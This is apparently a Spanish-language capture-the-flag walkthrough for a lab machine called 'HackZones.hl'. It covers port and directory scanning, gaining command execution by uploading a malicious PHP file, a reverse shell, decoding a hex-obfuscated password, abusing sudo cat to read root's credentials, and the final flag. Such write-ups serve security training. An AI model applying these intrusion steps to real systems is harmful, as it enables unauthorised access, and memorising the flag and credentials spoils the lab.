

                  <img width="545" height="297" alt="image" src="https://github.com/user-attachments/assets/e430792f-14f0-4350-b541-5cadadd0d634" />






# Enumeracion de Puertos,Servicios y Versiones

```ruby
nmap -Pn -n -sS -p- --open -sCV --min-rate 5000 <IP> -oN nmap
```
```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-17 11:35 -03
Nmap scan report for 172.17.0.2
Host is up (0.0000020s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 8e:a2:56:38:e1:85:2f:21:2b:55:ec:29:5b:f8:63:d9 (ECDSA)
|_  256 0f:4b:38:fa:04:33:c7:01:5a:98:12:05:2d:42:cf:1a (ED25519)
53/tcp open  domain  ISC BIND 9.18.28-0ubuntu0.24.04.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.18.28-0ubuntu0.24.04.1-Ubuntu
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: HackZones.hl - Seguridad para tu Empresa
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.84 seconds
```
Se observa que el dominio 'HackZones.hl' en el reporte que nos da 'nmap', lo podemos agregar al archivo '/etc/host' en mi caso es 
```ruby
echo '172.17.0.2 HackZones.hl' >> /etc/hosts
```
<img width="1916" height="933" alt="image" src="https://github.com/user-attachments/assets/fc93093c-63c6-4714-8b4d-4aafde8e675b" />

Este login puede ser vulnerable a intecion SQL, lo probamos y veremos que no es posible, Buscaremos otra manera realizandole Fuzzing web

# Fuzzing Web 

Usaremos esta herramienta para realizar, De tal manera que no sepan usarla os dejo el github de la herramienta -> (https://github.com/epi052/feroxbuster.git) 

```ruby
feroxbuster -u 'http://hackzones.hl/' -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -s 200,301,302 -x txt,php,bak,db,py,html,js,jpg,png,git -t 200 --random-agent --no-state -d 5
```
```bash
                                                                                                                                                                                                                                            
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://HackZones.hl/
 🚀  Threads               │ 200
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
 👌  Status Codes          │ [200, 301, 302]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ Random
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [txt, php, bak, db, py, html, js, jpg, png, git]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 5
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      181l      450w     5671c http://hackzones.hl/dashboard.html
200      GET       23l      163w     1377c http://hackzones.hl/upload.php
301      GET        9l       28w      314c http://hackzones.hl/uploads => http://hackzones.hl/uploads/
200      GET       23l       62w      860c http://hackzones.hl/index.html
302      GET        0l        0w        0c http://hackzones.hl/authenticate.php => index.html?error=1
200      GET       77l      135w     1246c http://hackzones.hl/styles.css
200      GET       23l       62w      860c http://hackzones.hl/
[####>---------------] - 6m   1037419/4567992 16m     found:7       errors:1234   
[####>---------------] - 6m    544016/2283919 1479/s  http://HackZones.hl/ 
[####>---------------] - 6m    499477/2283919 1358/s  http://hackzones.hl/ 
[####################] - 5s   2283919/2283919 501409/s http://hackzones.hl/uploads/ => Directory listing (add --scan-dir-listings to scan)   
```
# (feroxbuster)
 herramienta que estamos usando para hacer un escaneo de directorios en un sitio web y encontrar archivos o rutas ocultas.

(-u 'http://<ip>/')
Esto especifica la URL de destino donde Feroxbuster hará el escaneo.

(-w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt)
Este es el archivo de lista de palabras (wordlist) que contiene los posibles nombres de directorios o archivos a intentar.

(/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt)
es un archivo incluido en SecLists, una colección de listas de palabras muy comúnmente usada en pruebas de penetración. Esta lista contiene nombres comunes de archivos y directorios que podrían estar en el servidor objetivo.

(-s 200,301,302)
Esto le dice a Feroxbuster que se concentre en buscar las respuestas HTTP con los códigos de estado 200 (OK), 301 (Redirección permanente) y 302 (Redirección temporal). Estos códigos suelen indicar que la ruta o archivo existe en el servidor.

(-x txt,php,bak,db,py,html,js,jpg,png,git)
Esta opción especifica las extensiones de archivos a buscar. Feroxbuster intentará encontrar directorios o archivos con estas extensiones:

txt, php, bak, db, py, html, js, jpg, png, git

Por ejemplo, buscará index.php, config.bak, file.js, etc.

(-t 200) 
Esta opción establece el número de hilos de concurrentes que Feroxbuster utilizará durante el escaneo. En este caso, 200 hilos, lo que significa que puede hacer hasta 200 solicitudes HTTP simultáneamente para acelerar el proceso.

(--random-agent)
Utiliza un User-Agent aleatorio para cada solicitud HTTP que envía. Esto ayuda a evitar que el escaneo sea detectado por medidas de protección como firewalls o sistemas de detección de intrusos, ya que las solicitudes parecen provenir de diferentes navegadores.

(--no-state)
Esta opción le dice a Feroxbuster que no guarde el estado de las sesiones entre ejecuciones. Esto significa que cada vez que se ejecute, el escaneo será desde cero, sin recordar directorios encontrados previamente.

(-d 5)
La opción -d establece el número máximo de intentos de directorio a realizar. En este caso, 5. Esto puede ser útil si se quiere evitar una sobrecarga del servidor durante las pruebas.

Mas ejemplos de uso de esta herramienta --> (https://epi052.github.io/feroxbuster-docs/docs/examples/)

# Continucion de maquina 

Si vamos a 'http://hackzones.hl/dashboard.html' podremos ver lo siguiente:

<img width="1917" height="929" alt="image" src="https://github.com/user-attachments/assets/34ef7b6d-0568-493f-96cc-70e1e1cce4d1" />

DAREMOS CLICK EN LA FOTO DONDE DICE ADMIN, nos aparera los siguiente:

<img width="1158" height="726" alt="image" src="https://github.com/user-attachments/assets/41fb0f22-2671-443d-afba-2a3eba41c983" />

#Al  momento de subir el php malicioso iremos 'http://hackzones.hl/uploads' 

<img width="1010" height="518" alt="image" src="https://github.com/user-attachments/assets/379b949c-74b4-483b-962f-1bf330c7874f" />

<img width="1909" height="399" alt="image" src="https://github.com/user-attachments/assets/d024ab08-6aee-4675-91cf-7999d58704eb" />

ya con esto tenemos la ejecucion de comandos antes de ejecutarlos nos pondremos en escucha por net cat y envio la rever shell, para acceder al servidor


# Escalada De Privilegios 
Tratamiento de terminal
```bash
script /dev/null -c bash 
CTRL + Z 
stty raw -echo; fg
reset xterm
stty rows 38 columns 168
export TERM=xterm
export SHELL=bash
```
Revisamos  los usurios del sistema y encontramos solo uno
```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
bind:x:100:102::/var/cache/bind:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:101:103::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:996:996:systemd Resolver:/:/usr/sbin/nologin
sshd:x:102:65534::/run/sshd:/usr/sbin/nologin 
mrrobot:x:1000:1000::/home/mrRobot:/bin/bash <-- Unico usuario 
```
Como no temos acceso al directorio como 'mrRobot', revisando un poco en el sistema nos encontramos un archivo en '/tmp' y tras verlo nos damos cuenta que tiene subdominios que despues de agregarlos al archivo '/etc/hosts' y revisarlos no dan mucha imformacion, miraremos un poco mas que nos podemos encontrar, encontramos un script en '/var/www/html/supermegaultrasecretfolder'

cat secret.sh

```bash
#!/bin/bash

if [ "$(id -u)" -ne 0 ]; then
  echo "Este script debe ser ejecutado como root."
  exit 1
fi

p1=$(echo -e "\x50\x61\x73\x73\x77\x6f\x72\x64") 
p2="\x40"                                       
p3="\x24\x24"                                   
p4="\x21\x31\x32\x33"                           
```
este script esta codificado en hexadecimal y tras descodificarlo nos da la siguente password -> `Password@$$!123`  que resulta ser el usuario 'mrroboot' pueden usar (https://gchq.github.io/CyberChef/)

### mrrobot 

```ruby
sudo -l 
```

```bash
Matching Defaults entries for mrrobot on ac5304cc3f06:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User mrrobot may run the following commands on ac5304cc3f06:
    (ALL : ALL) NOPASSWD: /usr/bin/cat
```

```bash
cd /opt

sudo cat SistemUpdate

Reading package lists... Done
Building dependency tree       
Reading state information... Done
Calculating upgrade... Done
The following packages will be upgraded:
  libc-bin libc-dev-bin libc6 libc6-dev libc6-i386
5 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.
Need to get 8,238 kB of archives.
After this operation, 1,024 B of additional disk space will be used.
Do you want to continue? [Y/n] y
Get:1 http://archive.ubuntu.com/ubuntu focal-updates/main amd64 libc6 amd64 2.31-0ubuntu9.9 [2,737 kB]
Get:2 http://archive.ubuntu.com/ubuntu focal-updates/main amd64 libc-bin amd64 2.31-0ubuntu9.9 [635 kB]
Get:3 http://archive.ubuntu.com/ubuntu focal-updates/main amd64 libc6-dev amd64 2.31-0ubuntu9.9 [2,622 kB]
Get:4 http://archive.ubuntu.com/ubuntu focal-updates/main amd64 libc-dev-bin amd64 2.31-0ubuntu9.9 [189 kB]
Fetched 8,238 kB in 2s (4,119 kB/s)
Extracting user root:rooteable from packages: 50%  <-----Password
Extracting templates from packages: 100%
Preconfiguring packages ...
(Reading database ... 275198 files and directories currently installed.)
Preparing to unpack .../libc6_2.31-0ubuntu9.9_amd64.deb ...
Unpacking libc6:amd64 (2.31-0ubuntu9.9) over (2.31-0ubuntu9.8) ...
Preparing to unpack .../libc-bin_2.31-0ubuntu9.9_amd64.deb ...
Unpacking libc-bin (2.31-0ubuntu9.9) over (2.31-0ubuntu9.8) ...
Preparing to unpack .../libc6-dev_2.31-0ubuntu9.9_amd64.deb ...
Unpacking libc6-dev:amd64 (2.31-0ubuntu9.9) over (2.31-0ubuntu9.8) ...
Preparing to unpack .../libc-dev-bin_2.31-0ubuntu9.9_amd64.deb ...
Unpacking libc-dev-bin (2.31-0ubuntu9.9) over (2.31-0ubuntu9.8) ...
Setting up libc6:amd64 (2.31-0ubuntu9.9) ...
Setting up libc-bin (2.31-0ubuntu9.9) ...
Setting up libc-dev-bin (2.31-0ubuntu9.9) ...
Setting up libc6-dev:amd64 (2.31-0ubuntu9.9) ...
Processing triggers for libc-bin (2.31-0ubuntu9.9) ...

```
Si nos fijamos bien podremos ver la password de root 'root:rooteable' 

```bash
mrrobot@ac5304cc3f06:/opt$ su root
Password: rooteable
root@ac5304cc3f06:/# cd ~
root@ac5304cc3f06:~# ls
TrueRoot.txt  root.txt

root@ac5304cc3f06:~# cat TrueRoot.txt
f034967ad357f8f912740101d3af5e71
```
Esta es la solucion de esta maquina 
